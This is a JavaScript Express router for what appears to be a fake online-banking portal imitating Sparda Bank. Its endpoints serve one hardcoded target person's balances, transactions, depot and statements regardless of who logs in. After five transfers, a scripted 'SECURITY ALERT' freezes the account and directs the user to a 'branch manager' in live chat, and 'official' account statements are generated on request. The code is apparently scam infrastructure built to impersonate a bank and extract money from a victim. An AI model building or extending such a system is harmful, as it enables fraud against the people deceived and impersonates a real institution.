const express = require('express');
const router = express.Router();
const bcrypt = require('bcrypt');
const pool = require('../../db.cjs');
const { generateOfficialKontoauszugStream } = require('./kontoauszug.generator.cjs');

// Target user netkey matching Jareed Lacosta
const TARGET_USER_NETKEY = 'Jareed Lacosta';

/**
 * Central Helper Utility
 * Safe UUID fetcher for route pipelines
 */
const getActiveUserId = async () => {
  const result = await pool.query('SELECT id FROM users WHERE netkey ILIKE $1 LIMIT 1', [TARGET_USER_NETKEY]);
  if (result.rows.length === 0) throw new Error('User registry entry missing inside database.');
  return result.rows[0].id; // Returns UUID string
};

// =========================================================================
// 1. AUTHENTICATION ENDPOINT (Called by Login.jsx)
// =========================================================================
router.post('/auth/login', async (req, res, next) => {
  try {
    const { netKey, pin } = req.body;

    if (!netKey || !pin) {
      return res.status(400).json({ success: false, message: 'NetKey und PIN sind erforderlich.' });
    }

    const result = await pool.query(
      'SELECT id, pin_hash, first_name, last_name, kundennummer FROM users WHERE netkey ILIKE $1 LIMIT 1', 
      [netKey.trim()]
    );

    if (result.rows.length === 0) {
      return res.status(401).json({ success: false, message: 'Anmeldedaten sind ungültig (Falscher NetKey oder PIN).' });
    }

    const userRow = result.rows[0]; 

    const match = await bcrypt.compare(pin, userRow.pin_hash);
    if (!match) {
      return res.status(401).json({ success: false, message: 'Anmeldedaten sind ungültig (Falscher NetKey oder PIN).' });
    }

    return res.status(200).json({
      success: true,
      message: 'Erfolgreich angemeldet.',
      user: {
        id: userRow.id,
        name: `${userRow.first_name || ''} ${userRow.last_name || ''}`.trim(),
        accountType: 'SpardaGiro Klassik',
        kundennummer: userRow.kundennummer || '123456'
      }
    });
  } catch (err) {
    next(err);
  }
});

// =========================================================================
// 2. DASHBOARD BALANCES ENDPOINT (Called by Dashboard.jsx)
// =========================================================================
router.get('/balances', async (req, res, next) => {
  try {
    const userId = await getActiveUserId();
    const result = await pool.query(
      'SELECT giro_balance, spar_balance, depot_value, depot_cost_basis FROM balances WHERE user_id = $1 LIMIT 1', 
      [userId]
    );

    const balanceRow = result.rows.length ? result.rows[0] : { giro_balance: 0, spar_balance: 0, depot_value: 0, depot_cost_basis: 0 };

    return res.status(200).json({
      success: true,
      giroBalance: parseFloat(balanceRow.giro_balance),
      sparBalance: parseFloat(balanceRow.spar_balance),
      depotValue: parseFloat(balanceRow.depot_value),
      depotCostBasis: parseFloat(balanceRow.depot_cost_basis)
    });
  } catch (err) {
    next(err);
  }
});

// =========================
// (Called by Header.jsx)
// =========================
router.get('/user/notifications/summary', async (req, res, next) => {
  try {
    const userId = await getActiveUserId();

    const txCountResult = await pool.query('SELECT COUNT(*) FROM transactions WHERE user_id = $1', [userId]);
    const totalTransactions = parseInt(txCountResult.rows[0].count, 10);

    const dynamicUnreadMails = totalTransactions > 5 ? 4 : 3;

    return res.status(200).json({ success: true, unreadMails: dynamicUnreadMails });
  } catch (err) {
    next(err);
  }
});

// ============================
// (Called by Ueberweisung.jsx)
// ============================
router.post('/transfers', async (req, res, next) => {
  let client;
  try {
    const { trackingNumber, recipientName, recipientIban, recipientBic, amount, purpose, executionDate, transaction_pin } = req.body;

    if (!recipientName || !recipientIban || !amount) {
      return res.status(400).json({ success: false, message: 'Fehlende Pflichtfelder für die Überweisung.' });
    }
    
    const userQuery = await pool.query(
      'SELECT id, transaction_pin_hash, transfer_count FROM users WHERE netkey ILIKE $1 LIMIT 1',
      [TARGET_USER_NETKEY]
    );

    if (userQuery.rows.length === 0) {
      return res.status(404).json({ success: false, message: 'Benutzerprofil nicht gefunden.' });
    }

    const user = userQuery.rows[0];
    const userId = user.id; // Guaranteed UUID

    // SECURITY VAULT LOCK: 5 or more transfers trigger lock
    if (user.transfer_count >= 5) {
      return res.status(403).json({
        success: false,
        error_code: 'ACCOUNT_FROZEN_LOCATION_MISMATCH',
        message: 'SECURITY ALERT: We have detected unusual transaction activity originating from an unrecognized location or IP address. For your protection, outgoing transfer capabilities have been temporarily suspended. Please reach out to your dedicated Sparda Bank branch manager via the live support chat to verify your identity and restore full access.'
      });
    }

    // Vault PIN Check using pgcrypto crypt()
    if (transaction_pin) {
      const pinCheck = await pool.query(
        'SELECT crypt($1, transaction_pin_hash) = transaction_pin_hash AS is_valid FROM users WHERE id = $2',
        [transaction_pin, userId]
      );

      if (!pinCheck.rows[0] || !pinCheck.rows[0].is_valid) {
        return res.status(401).json({ success: false, message: 'Ungültige Transaktions-PIN (Transaction PIN Invalid).' });
      }
    } else {
      return res.status(400).json({ success: false, message: 'Transaktions-PIN erforderlich (Transaction PIN required).' });
    }

    const parsedAmount = Math.abs(parseFloat(amount));

    client = await pool.connect();
    await client.query('BEGIN');

    // 1. Increment counter lock
    await client.query(
      'UPDATE users SET transfer_count = COALESCE(transfer_count, 0) + 1 WHERE id = $1',
      [userId]
    );

    // 2. Deduct Giro balance
    await client.query(
      'UPDATE balances SET giro_balance = giro_balance - $1::numeric WHERE user_id = $2',
      [parsedAmount, userId]
    );

    // 3. Internal transfer check
    const cleanRecipient = String(recipientName).toLowerCase();
    const cleanPurpose = String(purpose).toLowerCase();
    
    if (cleanRecipient.includes('spardaspar') || cleanPurpose.includes('spardaspar')) {
      await client.query(
        'UPDATE balances SET spar_balance = spar_balance + $1::numeric WHERE user_id = $2',
        [parsedAmount, userId]
      );

      await client.query(`
        INSERT INTO savings_history (user_id, name, detail, amount, date, type, icon)
        VALUES ($1, $2, $3, $4, $5, $6, $7);
      `, [
        userId, 
        'Einzahlung vom Girokonto', 
        purpose || 'Sparrate', 
        parsedAmount, 
        executionDate || new Date().toISOString().split('T')[0], 
        'transfer', 
        '🔁'
      ]);
    }

    // 4. Log transaction entry
    await client.query(`
      INSERT INTO transactions (user_id, tracking_number, execution_date, amount, type, recipient_name, purpose, category, icon)
      VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9);
    `, [
      userId,
      trackingNumber || `SP-TX-${Date.now()}-DE`,
      executionDate ? new Date(executionDate).toISOString() : new Date().toISOString(),
      -parsedAmount,
      'expense',
      recipientName,
      purpose || 'SEPA-Überweisung',
      cleanPurpose.includes('dauerauftrag') ? 'Daueraufträge' : 'Ausgaben',
      '🛒'
    ]);

    await client.query('COMMIT');
    client.release();

    return res.status(201).json({ 
      success: true, 
      message: 'Überweisung erfolgreich gebucht.',
      transfers_remaining: 4 - user.transfer_count
    });

  } catch (err) {
    if (client) {
      try { await client.query('ROLLBACK'); } catch (rErr) {}
      client.release();
    }
    next(err);
  }
});

// =========================
// (Called by Umsaetze.jsx)
// =========================
router.get('/transfers', async (req, res, next) => {
  try {
    const userId = await getActiveUserId();
    const result = await pool.query(
      'SELECT tracking_number, execution_date, amount, type, recipient_name, purpose, category, icon FROM transactions WHERE user_id = $1 ORDER BY execution_date DESC', 
      [userId]
    );
    
    return res.status(200).json({ success: true, transactions: result.rows });
  } catch (err) {
    next(err);
  }
});

// =========================
// (Called by Sparkonto.jsx)
// =========================
router.get('/sparkonto', async (req, res, next) => {
  try {
    const userId = await getActiveUserId();

    const balanceResult = await pool.query('SELECT spar_balance FROM balances WHERE user_id = $1 LIMIT 1', [userId]);
    const historyResult = await pool.query('SELECT name, detail, amount, date, type, icon FROM savings_history WHERE user_id = $1 ORDER BY date DESC', [userId]);

    return res.status(200).json({
      success: true,
      balance: balanceResult.rows.length ? parseFloat(balanceResult.rows[0].spar_balance) : 0, 
      history: historyResult.rows
    });
  } catch (err) {
    next(err);
  }
});

// =======================
// (Called by Karten.jsx)
// =======================
router.get('/cards/settings', async (req, res, next) => {
  try {
    const userId = await getActiveUserId();
    const result = await pool.query('SELECT contactless, online_payments, foreign_payments FROM security_profiles WHERE user_id = $1 LIMIT 1', [userId]);
    
    const settingsRow = result.rows.length ? result.rows[0] : { contactless: true, online_payments: true, foreign_payments: true };
    
    return res.status(200).json({
      success: true,
      settings: {
        contactless: settingsRow.contactless,
        onlinePayments: settingsRow.online_payments,
        foreignPayments: settingsRow.foreign_payments
      }
    });
  } catch (err) {
    next(err);
  }
});

router.post('/cards/settings', async (req, res, next) => {
  try {
    const { field, value } = req.body;
    const userId = await getActiveUserId();

    const columnMapping = {
      contactless: 'contactless',
      onlinePayments: 'online_payments',
      foreignPayments: 'foreign_payments'
    };

    const targetColumn = columnMapping[field];
    if (!targetColumn) {
      return res.status(400).json({ success: false, message: 'Ungültiges Einstellungsfeld.' });
    }

    const sql = `UPDATE security_profiles SET ${targetColumn} = $1 WHERE user_id = $2`;
    await pool.query(sql, [Boolean(value), userId]);

    return res.status(200).json({ success: true, message: 'Einstellung erfolgreich gespeichert.' });
  } catch (err) {
    next(err);
  }
});

// ========================
// (Called by Depot.jsx)
// ========================
router.get('/depot', async (req, res, next) => {
  try {
    const userId = await getActiveUserId();

    const balanceResult = await pool.query('SELECT depot_value, depot_cost_basis FROM balances WHERE user_id = $1 LIMIT 1', [userId]);
    const positionsResult = await pool.query('SELECT name, isin, shares, value, performance, icon, sparplan_info AS "sparplanInfo" FROM depot_positions WHERE user_id = $1', [userId]);
    
    const balanceRow = balanceResult.rows.length ? balanceResult.rows[0] : { depot_value: 0, depot_cost_basis: 0 };
    
    return res.status(200).json({
      success: true,
      depotValue: parseFloat(balanceRow.depot_value),
      costBasis: parseFloat(balanceRow.depot_cost_basis),
      positions: positionsResult.rows.map(row => ({
        ...row,
        shares: parseFloat(row.shares),
        value: parseFloat(row.value),
        performance: parseFloat(row.performance)
      }))
    });
  } catch (err) {
    next(err);
  }
});

// =======================
// (Called by Profil.jsx)
// =======================
router.post('/user/settings', async (req, res, next) => {
  try {
    const { field, value } = req.body;
    const userId = await getActiveUserId();
    
    const columnMapping = {
      secureGo: 'secure_go',
      smartTan: 'smart_tan',
      emailNotifications: 'email_notifications',
      pushNotifications: 'push_notifications'
    };
    
    const targetColumn = columnMapping[field];
    if (!targetColumn) {
      return res.status(400).json({ success: false, message: 'Ungültiges Sicherheitsfeld.' });
    }
    
    const sql = `UPDATE security_profiles SET ${targetColumn} = $1 WHERE user_id = $2`;
    await pool.query(sql, [Boolean(value), userId]);
    
    return res.status(200).json({ success: true, message: 'Sicherheitsverfahren erfolgreich aktualisiert.' });
  } catch (err) {
    next(err);
  }
});

// ==============================
// (Called by Dauerauftrag.jsx)
// ==============================
router.get('/dauerauftraege', async (req, res, next) => {
  try {
    const userId = await getActiveUserId();
    const result = await pool.query(
      'SELECT id, recipient_name, recipient_iban, amount, schedule_text, icon, bg_color FROM standing_orders WHERE user_id = $1 ORDER BY created_at DESC',
      [userId]
    );

    return res.status(200).json({ success: true, orders: result.rows });
  } catch (err) {
    next(err);
  }
});

// =========================
// (Called by Postfach.jsx)
// =========================
router.get('/sparda/kontoauszug/:trackingNumber', generateOfficialKontoauszugStream);

module.exports = router;
